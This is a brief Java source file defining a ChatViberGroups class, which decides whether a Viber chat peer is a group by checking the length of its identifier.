package com.android.networking.module.chat;

public class ChatViberGroups extends ChatGroups {

	@Override
	boolean isGroup(String peer) {
		//return peer.startsWith("group");
		return peer.length() > 16;
	}

	
}
